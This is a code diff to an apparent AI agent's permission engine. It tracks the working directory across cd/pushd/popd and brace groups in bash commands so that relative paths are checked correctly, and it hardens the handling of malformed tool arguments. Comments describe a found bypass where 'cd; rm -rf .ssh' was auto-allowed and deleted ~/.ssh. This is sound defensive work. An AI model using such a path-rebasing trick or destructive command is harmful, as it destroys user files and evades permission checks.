+        if p.is_absolute():
+            return p
+        return (cur / p) if cur is not None else None
+
+    def _bash_cwd_walk(self, command: str, start: "Optional[Path]", _depth: int = 0) -> "tuple[list, Optional[Path]]":
+        """vibes/review.md finding 7 + review item 2: [(segment, cwd in
+        effect for it)] for every segment of `command`, and the cwd after the
+        last one. `cd`/`pushd` move it (bare `cd` is $HOME, option words are
+        skipped), `popd` makes it unknown (None), and a `{ ...; }` group's
+        own `cd` carries out of the group while a `( ... )` subshell's does
+        not. Callers treat None as unknown -- never as the project cwd."""
+        pairs: list = []
+        cur = start
+        for seg in split_bash_segments(command, opener_scan=True):
+            pairs.append((seg, cur))
+            tokens = _tokenize_loose(seg)
+            while tokens and (_ENV_ASSIGN_ANY_RE.match(tokens[0]) or tokens[0] in _ps.CONTROL_WORDS):
                 tokens.pop(0)
-            if not tokens or tokens[0] != "cd" or len(tokens) < 2:
+            if not tokens:
                 continue
-            dest = tokens[1]
-            if dest.startswith("$") or "`" in dest or '"' in dest or "'" in dest:
-                return None
-            if dest == "..":
-                cwd = cwd.parent
-                continue
-            if dest == "-":
-                return None  # previous dir -- unknowable here
-            if dest.startswith("~"):
-                rest = dest[1:].lstrip("/\\")
-                cwd = (Path.home() / rest) if rest else Path.home()
-                continue
-            candidate = Path(dest)
-            cwd = candidate if candidate.is_absolute() else (cwd / candidate)
-        try:
-            return cwd.resolve()
-        except OSError:
-            return cwd
+            if tokens[0] in ("cd", "pushd"):
+                cur = self._cd_destination(tokens[1:], cur, pushd=tokens[0] == "pushd")
+            elif tokens[0] == "popd":
+                cur = None
+            elif seg.lstrip().startswith("{") and _depth < 4:
+                groups = _scan.span_bodies(seg, nested=False)[1]
+                if groups:
+                    cur = self._bash_cwd_walk(groups[0], cur, _depth + 1)[1]
+        return pairs, cur
 
     def _bash_is_edit_like_in_workdir(self, command: str) -> bool:
-        segments = split_bash_segments(command)
-        if not segments:
-            return False
-        # finding 7: judge every segment against the cwd IN EFFECT AT THAT
-        # POINT (a leading `cd ~` re-bases every later relative path -- the
-        # review's repro auto-allowed `rm -rf .ssh` in acceptEdits while it
-        # deleted ~/.ssh). Unknown destinations (cd $VAR, cd -) fail the
+        # finding 7 / review item 2: judge every segment against the cwd IN
+        # EFFECT AT THAT POINT (a leading `cd ~`, a bare `cd`, `cd -- ~` or
+        # `cd -P ~` re-bases every later relative path -- `cd; rm -rf .ssh`
+        # deletes ~/.ssh). An unknown cwd (cd $VAR, cd -, popd) fails the
         # whole check -- outside, never silently the project cwd.
-        cur = self.cwd
-        for seg in segments:
+        pairs, final = self._bash_cwd_walk(command, self.cwd)
+        if not pairs or final is None:
+            return False
+        for seg, cur in pairs:
             try:
                 tokens = shlex.split(seg, posix=True)
             except ValueError:
                 return False
             if not tokens:
                 return False
-            if tokens[0] == "cd":
-                if len(tokens) < 2:
-                    continue
-                dest = tokens[1]
-                if dest.startswith("$") or "`" in dest or dest == "-":
-                    return False
-                if dest.startswith("~"):
-                    rest = dest[1:].lstrip("/\\")
-                    cur = (Path.home() / rest) if rest else Path.home()
-                elif dest == "..":
-                    cur = cur.parent
-                else:
-                    cand = Path(dest)
-                    cur = cand if cand.is_absolute() else (cur / cand)
+            if tokens[0] in ("cd", "pushd", "popd"):
                 continue
-            if tokens[0] not in _EDIT_LIKE_BASH_CMDS:
+            if tokens[0] not in _EDIT_LIKE_BASH_CMDS or cur is None:
                 return False
             live_cwd = cur
             for tok in tokens[1:]:
@@ -2181,6 +2249,10 @@ class PermissionEngine:
             decision = self._decide(tool_name, ti, tool)
         except (ValueError, OSError) as e:
             decision = Decision("deny", f"could not resolve a path for this {tool_name} call: {e}", source="error")
+        except (TypeError, AttributeError) as e:
+            # review item 21: a malformed tool_input (a field of the wrong
+            # type) is an error result for this one call, never a dead turn.
+            decision = Decision("deny", f"could not read the arguments of this {tool_name} call: {e}", source="error")
         if decision.action == "deny" and decision.permission_denial is None and self.print_mode:
             decision.permission_denial = {
                 "tool_name": tool_name, "tool_input": ti,
@@ -2278,7 +2350,7 @@ class PermissionEngine:
     def suggest_rule(self, tool_name: str, tool_input: Optional[dict] = None) -> Optional[str]:
         tool_input = tool_input or {}
         if tool_name == "Bash":
-            command = tool_input.get("command", "").strip()
+            command = _str_field(tool_input, "command").strip()
             if not command:
                 return None
             # finding 13: one suggestion PER non-read-only segment -- a
@@ -2311,26 +2383,26 @@ class PermissionEngine:
                     suggestions.append(text)
             return ", ".join(suggestions) if suggestions else None
         if tool_name == "PowerShell":
-            command = tool_input.get("command", "").strip()
+            command = _str_field(tool_input, "command").strip()
             canon = canonicalize_powershell(command) if command else ""
             cmdlet = canon.split(None, 1)[0] if canon else ""
             return f"PowerShell({_escape_rule_content(cmdlet)}:*)" if cmdlet else None
         if tool_name == "Read":
-            path = tool_input.get("file_path", "")
+            path = _str_field(tool_input, "file_path")
             if not path:
                 return None
             p = Path(path)
             target = p if p.is_absolute() else (self.cwd / p)
             return f"Read({_escape_rule_content(self._suggest_path_value(target))})"
         if tool_name in ("Edit", "Write"):
-            path = tool_input.get("file_path", "")
+            path = _str_field(tool_input, "file_path")
             if not path:
                 return None
             rel_dir = Path(path).parent
             return f"Edit({_escape_rule_content(self._suggest_path_value(rel_dir))}/**)"
         if tool_name == "WebFetch":
             from urllib.parse import urlparse
-            host = urlparse(tool_input.get("url", "")).hostname
+            host = urlparse(_str_field(tool_input, "url")).hostname
             return f"WebFetch(domain:{host})" if host else None
         if tool_name.startswith("mcp__"):
             # finding 9: server names carry no `__`, so the FIRST `__` after
@@ -2493,6 +2565,8 @@ def freeze_tool_registry(registry, *, tools_flag: Optional[str] = None,
     for raw in (disallowed_tools or []):
         if "(" not in raw:
             bare.add(raw.strip())
+    if "Agent" in bare or "Task" in bare:  # review item 92: one tool, two names
+        bare |= {"Agent", "Task"}
     bare |= mcp_deny_tool_names(deny_rules, registry.names())
     if bare:
         registry = registry.without(bare)
